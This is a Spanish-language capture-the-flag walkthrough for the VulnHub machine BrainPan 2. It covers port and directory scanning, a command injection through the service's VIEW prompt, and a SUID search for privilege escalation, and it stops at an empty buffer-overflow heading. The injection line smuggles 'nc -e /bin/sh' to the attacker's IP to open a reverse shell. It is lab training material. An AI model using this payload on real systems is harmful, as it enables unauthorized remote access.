# BrainPan2
Desarrrollo del CTF BrainPan 2. Download: https://www.vulnhub.com/entry/brainpan-2,56/

## Escaneo de Puertos
```
nmap -n -P0 -p- -sS -sC -sV -vv -T5 -oA full 192.168.78.137
Not shown: 65533 closed ports
Reason: 65533 resets
PORT      STATE SERVICE REASON         VERSION
9999/tcp  open  abyss?  syn-ack ttl 64
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [______________________ WELCOME TO BRAINPAN 2.0________________________]
|_    LOGIN AS GUEST
10000/tcp open  http    syn-ack ttl 64 SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Hacking Trends
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.91%I=7%D=2/17%Time=602D3B79%P=x86_64-pc-linux-gnu%r(NU
SF:LL,296,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|
SF:\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\
```

<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain1.jpg" width="60%"></img>

## Enumeracion de Carpetas 
```
root@kali:~/BRAINPAN2# gobuster dir -u http://192.168.78.137:10000/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.78.137:10000/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/17 11:14:47 Starting gobuster
===============================================================
/bin (Status: 301)
===============================================================
2021/02/17 11:16:05 Finished
===============================================================
```
<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain2.jpg" width="60%"></img>


## Análisis del archivo BRAINPAN.EXE
El archivo EXE realmente es una archivo del JPEG

<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain3.jpg" width="60%"></img>

## Inyección de comandos

1. La conexión indica que ingresemos con el usuario "GUEST"

<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain4.jpg" width="60%"></img>

2. Buscamos las opciones que puedan permitir INYECCIÓN
El comando VIEW permite realizar inyecciones de comandos.

<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain5.jpg" width="60%"></img>

3. A través de la INYECCIÓN ejecutamos un NETCAT para obtener conexión remota.

```
                         >> VIEW
    ENTER FILE TO DOWNLOAD: id; nc -e /bin/sh 192.168.78.131 5555
```
<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain6.jpg" width="60%"></img>


## ELEVAR PRIVILEGIOS

### Archivos con SETUID

1. Buscamos archivos con el SETUID del usuario ROOT.
```
find / -perm -u=s -type f 2>/dev/null
```
<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain7.jpg" width="60%"></img>


### BOF en Linux

















